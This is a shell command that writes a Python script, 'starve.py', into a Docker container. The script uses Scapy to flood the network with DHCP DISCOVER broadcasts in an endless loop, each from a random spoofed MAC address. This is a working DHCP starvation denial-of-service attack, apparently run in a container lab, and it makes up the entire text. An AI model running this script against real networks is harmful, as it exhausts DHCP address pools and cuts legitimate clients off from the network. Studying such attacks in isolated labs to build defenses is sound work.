sudo docker exec 07c15f5ee790 sh -c "cat > /tmp/starve.py << 'EOF'
from scapy.all import *
import random

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0,255)) for _ in range(6)])

count = 0
try:
    while True:
        mac = random_mac()
        raw = mac.replace(':','')
        pkt = (Ether(src=mac,dst='ff:ff:ff:ff:ff:ff')/IP(src='0.0.0.0',dst='255.255.255.255')/UDP(sport=68,dport=67)/BOOTP(chaddr=bytes.fromhex(raw.ljust(32,'0')[:24]),xid=random.randint(1,0xFFFFFFFF))/DHCP(options=[('message-type','discover'),'end']))
        sendp(pkt,iface='eth0',verbose=0)
        count += 1
        if count % 10 == 0:
            print(f'Sent {count} packets...')
except KeyboardInterrupt:
    print(f'Done. Sent {count} packets')
EOF"
